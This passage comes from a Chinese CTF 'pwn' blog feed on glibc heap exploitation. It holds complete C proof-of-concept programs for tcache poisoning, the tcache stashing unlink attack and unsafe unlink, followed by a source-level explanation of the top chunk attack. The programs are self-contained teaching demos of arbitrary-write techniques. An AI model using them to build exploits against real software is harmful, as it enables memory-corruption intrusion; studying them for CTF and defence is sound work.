class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>此技巧就是通过溢出等漏洞修改tcache链表上的next指针</p>
<ul>
<li><p>我们需要tcachebin中有两个chunk，a b</p>
</li>
<li><p>free(a);free(b);</p>
</li>
<li><p>通过溢出等修改tcachebin链表头部(如b-&gt;a，b就是头部)的next指针，为&amp;stack_var</p>
</li>
<li><p>连续申请俩次就可以申请出栈上的那块内存</p>
</li>
</ul>
<h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p>关于smallbin的攻击，必须有至少一次calloc()分配</p>
<ol>
<li>申请 9 个 chunk，释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>申请一个 大于 上述 chunk size (0x90)的chunk，unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li>修改 chunk 2 的 <strong>bk指针</strong> 指向我们伪造的内存地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</li>
</ol>
<p>此时smallbin bk处如：<code>BK: 0x564523298290(chunk 0) —▸ 0x5645232983d0(chunk2) —▸ 0x7fff26072120 —▸ 0x7fff26072130 ◂— 0</code></p>
<ol start="5">
<li><p>调用 calloc() 申请 与tcache 同大小的 chunk，会直接从 small bin中 取 chunk0；</p>
</li>
<li><p>此时small bin 中剩余的 chunk2-&gt; fake chunk，会<strong>从后向前 加入</strong> tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</p>
</li>
<li><p>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</p>
</li>
</ol>
<h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><p>向任意地址写入libc地址，任意地址分配</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242L</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>malloc_size &#x3D; 0x420;要足够大不使用tcache和fastbin</p>
<p>chunk0_ptr &#x3D; malloc(malloc_size)<br>		chunk1_ptr &#x3D; malloc(malloc_size)</p>
<p>接着我们再chunk0里伪造一个fake_chunk</p>
<p>size&#x3D;chunk1_ptr的size-0x10<br>		fd&#x3D;chunk0_ptr的地址-0x18<br>		bk&#x3D;chunk0_ptr的地址-0x10<br>（特别注意这里是chunk0_ptr地址，地址上存的才是堆的地址）</p>
<p>现在假设chunk0中存在溢出，我们可以随意改chunk1的值，接着我们改chunk1的prev_size为0x420，size的use位设为0</p>
<p>然后我们释放chunk1，就能触发unlink，向后合并</p>
<p>现在chunk0的指针指向自己了</p>
<p>然后我们可以通过释放这个指针两次doublefree造成任意地址写任意值</p>
<p>（不过libc2.32就有新的防御，新的防御机制-safe-linking(异或加密),其核心思想是:将指针的地址右移12位再和指针本身异或，这种unlink用不了啦</p>
<h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Top chunk attack</title>
    <url>/2025/04/09/top%20chunk%20atttack/</url>
    <content><![CDATA[<h1 id="了解-Top-chunk"><a href="#了解-Top-chunk" class="headerlink" title="了解 Top chunk"></a>了解 Top chunk</h1><p>这是top chunk分配的源码（glibc2.23 malloc.c 3790行左右）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//*</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//*</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>从glibc里的malloc源代码里也可以看到top chunk的切割过程，在bins里没有合适chunk的情况下，如果top chunk的size大于请求的size + MINSIZE，就可以从top chunk里进行切割。</p>
<p>如果top chunk不够分割，则调用sysmalloc进行内存分配，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进sysmalloc()</p>
<p>首先，它会检测申请的内存是否大于mmap的分配阈值，如果大于则用mmap进行分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">    <span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>否则扩充 top chunk 以便从中切割</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">old_heap = heap_for_ptr (old_top);</span><br><span class="line">old_heap_size = old_heap-&gt;size;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">    &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    set_head (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">              | PREV_INUSE);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br></pre></td></tr></table></figure>

<p>如果不满足top chunk扩充的条件的话，old_top_chunk会被free掉，向系统批发新的top_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">    heap-&gt;ar_ptr = av;</span><br><span class="line">    heap-&gt;prev = old_heap;</span><br><span class="line">    av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">    arena_mem += heap-&gt;size;</span><br><span class="line">    <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">    top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">    set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">       MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">    <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">       become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">       up, too, although the chunk is marked in use. */</span></span><br><span class="line">    old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= MINSIZE)<span class="comment">//*</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">        set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">        _int_free (av, old_top, <span class="number">1</span>);<span class="comment">//*</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br></pre></td></tr></table></figure>

<h1 id="从源码分析top-chunk-attack"><a href="#从源码分析top-chunk-attack" class="headerlink" title="从源码分析top chunk attack"></a>从源码分析top chunk attack</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#libc-2.23中malloc源码第3793-3809行</span></span><br><span class="line">	  victim = av-&gt;top;<span class="comment">//获取当前top_chunk</span></span><br><span class="line">      size = chunksize (victim);<span class="comment">//计算top_chunk的大小</span></span><br><span class="line">	 <span class="comment">// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;<span class="comment">//top_chunk指针更新</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">chunk_at_offset (victim, nb)的宏定义（代码第<span class="number">1312</span><span class="number">-1313</span>行）</span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);<span class="comment">//更新top_chunk_size</span></span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这是_int_malloc()源码中调用top chunk的部分，注意到<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>在进行比较时用的是unsigned long。如果程序存存在溢出等漏洞可以将top chunk的size修改，就可以得到漏洞利用。例如将size修改为-1(0xffffffffffffffff)，那么这将使得从top chunk地址开始后所有的内存都被包含在了top chunk里，可以被自由切割。</p>
<p>而且呢top chunk的位置移动仅进行了地址的位移（即地址的加减运算）</p>
